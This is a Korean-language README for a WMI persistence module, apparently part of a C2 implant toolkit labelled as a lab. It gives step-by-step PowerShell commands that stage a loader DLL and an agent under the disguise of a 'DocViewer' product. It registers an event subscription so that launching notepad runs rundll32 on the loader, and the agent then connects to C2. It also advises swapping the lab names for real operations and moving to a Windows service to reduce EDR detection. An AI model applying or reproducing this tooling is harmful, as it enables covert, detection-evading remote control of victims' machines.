# WMI Persistence — DocViewer lab (v1.4.3)

> 작성: 2026-07-31  
> 스크립트: `persistence/wmi_install.ps1`, `persistence/wmi_persist.ps1`  
> ⚠️ v1.7 (2026-08-04): **기본 영속은 MSI의 Windows 서비스(`DocViewerHelper`)로 전환.**  
> WMI 구독은 EDR 고신호 → **보조/레거시 경로로만 사용** 권장. 자세한 이유는 `docs/edr-detection-surface.md` §고위험 참고.

## 동작

| 항목 | 기본값 (config.lab.env) |
|------|-------------------------|
| Trigger | `__InstanceCreationEvent` within `INTERVAL_MIN` sec for `Win32_Process` Name=`TARGET_PROC` |
| Default target | `notepad.exe` |
| Consumer | `CommandLineEventConsumer` → `rundll32.exe "PAYLOAD_PATH",EntryPoint` |
| Filter name | `DocViewerUpdateEvent` |
| Consumer name | `DocViewerUpdateConsumer` |
| Payload path | `C:\ProgramData\DocViewer\DocViewerCore.dll` (= loader.dll) |
| Helper | 같은 폴더의 `DocViewerHelper.exe` (= agent.exe) — loader가 기동 |

## 설치 (관리자 PowerShell)

```powershell
# stage
New-Item -ItemType Directory -Force C:\ProgramData\DocViewer | Out-Null
Copy-Item bin\loader.dll  C:\ProgramData\DocViewer\DocViewerCore.dll -Force
Copy-Item bin\agent.exe   C:\ProgramData\DocViewer\DocViewerHelper.exe -Force

# install subscription
.\persistence\wmi_install.ps1 -Action install
.\persistence\wmi_install.ps1 -Action status
.\persistence\wmi_install.ps1 -Action status -Json   # machine-readable

# trigger
Start-Process notepad
# → rundll32 loads DLL EntryPoint → helper agent connects C2

# cleanup
.\persistence\wmi_install.ps1 -Action uninstall
```

라이브 원샷: `.\scripts\wmi_live_test.ps1` (stage → install → notepad → wait agent → uninstall).

## 스모크

`.\scripts\smoke_windows.ps1` 의 WMI 섹션이 install/status/trigger/uninstall 을 수행.  
스킵: `$env:SMOKE_SKIP_WMI=1`

## 운영 주의

- **관리자 권한** 필수 (root\subscription)
- lab 전용 이름/경로 — 실운영 시 EVENT/CONSUMER/경로 교체
- kill-date/agent token 은 helper(agent) 환경·설정에 따름
- 제거 확인: status 후 filter/consumer 모두 absent

## 구현 상태

| 항목 | 상태 |
|------|------|
| Filter + Consumer + Binding | 구현됨 |
| install / uninstall / status | 구현됨 |
| -Json status | v1.4.3 추가 |
| bin/ 스테이지 (build.sh persistence) | 구현됨 |
| MSI 연동 설치 | msi_install_lab.ps1 별도 |
